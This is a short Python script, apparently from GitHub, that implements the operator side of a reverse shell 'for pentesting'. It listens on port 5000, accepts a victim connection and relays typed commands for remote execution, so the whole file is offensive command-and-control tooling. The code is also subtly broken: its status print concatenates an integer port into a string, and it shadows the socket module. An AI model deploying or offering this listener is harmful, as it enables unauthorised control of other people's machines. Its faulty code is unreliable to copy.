#Any responsibility is rejected in terms of unauthorized usage -Python Reverse Shell for pentesting 
#Github -> YararbasK

import socket

RHOST = "0.0.0.0"
RPORT = 5000

BUFFER_SIZE = 1024
socket = socket.socket()
socket.bind((RHOST , RPORT))

socket.listen(1)
print("Listening as {}".format(RHOST + " With The Port Number " + RPORT))
client_socket , client_adress = socket.accept()
print("Connected!")

message = "Connection is successfully completed try a command for further demonstration (WHOAMİ)".encode()
client_socket.send(message)

while True:
    command = input("Py Shell -> Command = ")
    client_socket.send(command.encode())
    if command.lower() == "exit":
        print("Exiting From shell ....")
        break;
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)

client_socket.close()
socket.close()

